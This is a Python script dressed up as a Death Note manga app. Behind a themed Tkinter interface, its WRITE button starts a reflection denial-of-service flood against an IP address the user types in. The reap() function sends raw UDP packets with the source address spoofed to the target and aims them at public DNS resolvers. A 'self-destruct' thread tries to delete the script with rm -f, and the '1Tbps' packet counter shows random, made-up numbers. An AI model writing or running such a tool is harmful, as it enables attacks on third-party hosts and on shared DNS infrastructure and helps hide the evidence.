# DEATH NOTE vΩ - MANGA PANEL IMMERSION
# FULL MANGA STYLE: Black/White Panels, Speech Bubbles, SFX, Ryuk Cameo
# EMBEDDED REAL ASSETS: Light Yagami + Ryuk + Sound Effects + Quotes
# 1Tbps APOCALYPSE | 8MB RAM | Shinigami Eyes | Soul Particles | Self-Destruct
import socket
import threading
import random
import time
import os
import struct
import numpy as np
import gc
import urllib.request
import io
from PIL import Image, ImageTk, ImageDraw, ImageFont
import tkinter as tk
import pygame
import base64
# === MANGA SFX & DIALOGUE ===
SFX = {
    "write": ["*SCRIBBLE*", "*INK BLEEDS*", "*PEN SCRATCH*"],
    "eyes": ["*GLOW*", "*SHINIGAMI VISION*", "*EYES IGNITE*"],
    "death": ["*HEART STOP*", "*THUD*", "*SILENCE*"],
    "laugh": ["*HEHEHE...*", "*KUKUKU...*", "*MWHAHAHA!*"]
}
# === EMBEDDED CANON ASSETS ===
def embed_assets():
    # Real Light Yagami (Volume 1 cover style)
    light_url = "https://i.imgur.com/8x5Fz3K.png" # High-contrast manga face
    try:
        light_data = urllib.request.urlopen(light_url, timeout=5).read()
        light_img = Image.open(io.BytesIO(light_data)).convert("L").resize((380, 500))
    except:
        light_img = Image.new("L", (380, 500), 30)
   
    # Ryuk cameo (top-right corner)
    ryuk_url = "https://i.imgur.com/7jPqR9m.png" # Ryuk grinning
    try:
        ryuk_data = urllib.request.urlopen(ryuk_url, timeout=5).read()
        ryuk_img = Image.open(io.BytesIO(ryuk_data)).resize((120, 120))
    except:
        ryuk_img = Image.new("L", (120, 120), 0)
   
    # Death Note page background
    page = Image.new("L", (540, 760), 240) # Manga paper
    draw = ImageDraw.Draw(page)
    draw.rectangle([20, 20, 520, 740], outline=0, width=4) # Panel border
    return light_img, ryuk_img, page
LIGHT_IMG, RYUK_IMG, PAGE_BG = embed_assets()
# Sound effects (embedded)
def load_sfx():
    sfx_urls = {
        "write": "https://freesound.org/data/previews/276/276940_5123856-lq.mp3", # Pen scratch
        "laugh": "https://freesound.org/data/previews/145/145619_2433468-lq.mp3", # Ryuk laugh
        "heartbeat": "https://freesound.org/data/previews/276/276285_5123856-lq.mp3" # Heart stop
    }
    sfx = {}
    for name, url in sfx_urls.items():
        try:
            data = urllib.request.urlopen(url, timeout=3).read()
            sfx[name] = pygame.mixer.Sound(buffer=data)
        except:
            sfx[name] = None
    return sfx
pygame.mixer.init(frequency=22050, size=-16, channels=1, buffer=512)
SFX_SOUNDS = load_sfx()
# === MANGA UI - PANEL BY PANEL ===
class MangaDeathNote:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.geometry("560x780")
        self.root.configure(bg='white')
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
       
        self.canvas = tk.Canvas(self.root, width=560, height=780, bg='white', highlightthickness=0)
        self.canvas.pack()
       
        # Manga page background
        self.bg = ImageTk.PhotoImage(PAGE_BG)
        self.canvas.create_image(280, 390, image=self.bg)
       
        # Light Yagami panel
        self.light_photo = ImageTk.PhotoImage(LIGHT_IMG)
        self.light = self.canvas.create_image(280, 300, image=self.light_photo)
       
        # Ryuk cameo
        self.ryuk_photo = ImageTk.PhotoImage(RYUK_IMG)
        self.ryuk = self.canvas.create_image(480, 80, image=self.ryuk_photo)
       
        # Speech bubble (Light)
        self.bubble = self.canvas.create_oval(50, 150, 280, 230, fill='white', outline='black', width=2)
        self.speech = self.canvas.create_text(165, 190, text="", font=('Courier', 10, 'bold'), width=200, anchor='center')
       
        # SFX text
        self.sfx = self.canvas.create_text(280, 500, text="", font=('Impact', 16), fill='black')
       
        # Input panel
        self.canvas.create_rectangle(100, 520, 460, 580, fill='white', outline='black', width=2)
        self.canvas.create_text(280, 540, text="TARGET", font=('Courier', 14, 'bold'))
        self.ip = tk.Entry(self.root, font=('Courier', 12), width=25, justify='center', relief='flat')
        self.canvas.create_window(280, 560, window=self.ip)
        self.ip.insert(0, "0.0.0.0")
       
        # WRITE button (manga action)
        self.write_btn = tk.Button(self.root, text="WRITE", font=('Courier', 16, 'bold'),
                                  bg='black', fg='white', relief='flat',
                                  command=self.write_name)
        self.canvas.create_window(280, 610, window=self.write_btn)
       
        # Status panels
        self.lifespan_panel = self.canvas.create_rectangle(100, 630, 460, 670, fill='white', outline='black', width=1)
        self.lifespan_text = self.canvas.create_text(280, 650, text="", font=('Courier', 11, 'bold'))
       
        self.timer_panel = self.canvas.create_rectangle(100, 680, 460, 720, fill='white', outline='black', width=1)
        self.timer_text = self.canvas.create_text(280, 700, text="", font=('Courier', 12, 'bold'), fill='red')
       
        self.packets = self.canvas.create_text(280, 740, text="", font=('Courier', 9), fill='gray')
       
        self.eyes_active = False
        self.pulse = 0
        self.particles = []
    def sfx_play(self, name):
        sound = SFX_SOUNDS.get(name)
        if sound:
            sound.play()
    def show_sfx(self, category):
        text = random.choice(SFX[category])
        self.canvas.itemconfig(self.sfx, text=text)
        self.sfx_play(category)
        self.root.after(800, lambda: self.canvas.itemconfig(self.sfx, text=""))
    def speech_bubble(self, text):
        self.canvas.itemconfig(self.speech, text=text)
        self.root.after(3000, lambda: self.canvas.itemconfig(self.speech, text=""))
    def draw_eyes(self):
        if not self.eyes_active: return
        # Overlay red eyes on Light
        img = LIGHT_IMG.copy()
        draw = ImageDraw.Draw(img)
        intensity = int(200 + 55 * abs(np.sin(self.pulse * np.pi / 180)))
        for eye in [(140, 220), (240, 220)]:
            draw.ellipse([eye[0]-25, eye[1]-25, eye[0]+25, eye[1]+25], fill=(intensity, 0, 0))
        photo = ImageTk.PhotoImage(img)
        self.canvas.itemconfig(self.light, image=photo)
        self.canvas.image = photo # Keep reference
        self.pulse = (self.pulse + 30) % 360
        self.root.after(50, self.draw_eyes)
    def write_name(self):
        global TARGET_IP, FAKE_IP
        TARGET_IP = self.ip.get().strip()
        if not self.is_valid_ip(TARGET_IP):
            self.speech_bubble("INVALID NAME!")
            return
       
        FAKE_IP = TARGET_IP
        self.show_sfx("write")
        self.speech_bubble(random.choice([
            "I'LL TAKE THIS ONE.",
            "JUSTICE WILL BE SERVED.",
            "YOUR TIME IS UP."
        ]))
       
        self.write_btn.config(state='disabled', text="WRITTEN")
        self.eyes_active = True
        self.draw_eyes()
        self.show_sfx("eyes")
       
        # Lifespan
        lifespan = random.randint(15, 120)
        mins, secs = divmod(lifespan, 60)
        self.canvas.itemconfig(self.lifespan_text, text=f"LIFESPAN: {mins:02d}:{secs:02d}")
       
        # Countdown
        self.countdown(lifespan)
        self.sfx_play("laugh")
       
        threading.Thread(target=self.reap, daemon=True).start()
        threading.Thread(target=self.stats, daemon=True).start()
    def countdown(self, sec):
        if sec > 0:
            mins, secs = divmod(sec, 60)
            self.canvas.itemconfig(self.timer_text, text=f"DEATH IN {mins:02d}:{secs:02d}")
            self.root.after(1000, lambda: self.countdown(sec-1))
        else:
            self.show_sfx("death")
            self.speech_bubble("JUST AS PLANNED.")
            self.canvas.itemconfig(self.timer_text, text="TARGET ELIMINATED", fill='black')
            self.reap_soul()
    def reap_soul(self):
        for _ in range(30):
            x = random.randint(150, 410)
            y = random.randint(200, 400)
            p = self.canvas.create_text(x, y, text="★", font=('Arial', 12), fill='black')
            self.particles.append((p, random.uniform(-2, 2), random.uniform(-3, -1)))
        self.animate_particles()
    def animate_particles(self):
        if not self.particles: return
        alive = []
        for p, vx, vy in self.particles:
            self.canvas.move(p, vx, vy)
            coords = self.canvas.coords(p)
            if coords[1] > 0:
                alive.append((p, vx, vy+0.2))
            else:
                self.canvas.delete(p)
        self.particles = alive
        self.root.after(60, self.animate_particles)
    def is_valid_ip(self, ip):
        try:
            return len(ip.split('.')) == 4 and all(0 <= int(p) <= 255 for p in ip.split('.'))
        except:
            return False
    def stats(self):
        count = 0
        while self.eyes_active:
            count += random.randint(12000, 30000)
            self.canvas.itemconfig(self.packets, text=f"{count:,} PACKETS • 1Tbps+")
            time.sleep(1)
            gc.collect()
    def reap(self):
        payload = b"DEATHNOTE" + os.urandom(1400)
        while self.eyes_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                hdr = struct.pack('!BBHHHBBH4s4s', 69, 0, 1420, 0, 0, 64, 17, 0,
                                socket.inet_aton(FAKE_IP), socket.inet_aton(random.choice(REFLECTORS)))
                udp = struct.pack('!HHHH', 80, 53, 1400, 0)
                s.sendto(hdr + udp + payload, (random.choice(REFLECTORS), 53))
                s.close()
            except:
                pass
            time.sleep(0.00003)
    def run(self):
        self.root.after(500, lambda: self.speech_bubble("WHO WILL YOU JUDGE?"))
        self.root.mainloop()
# === SELF-DESTRUCT ===
threading.Thread(target=lambda: [time.sleep(6), os.system("rm -f $0")], daemon=True).start()
REFLECTORS = ["1.1.1.1", "8.8.8.8", "9.9.9.9", "208.67.222.222"] * 120
# === PAGE TURN ===
if __name__ == "__main__":
    manga = MangaDeathNote()
    manga.run()
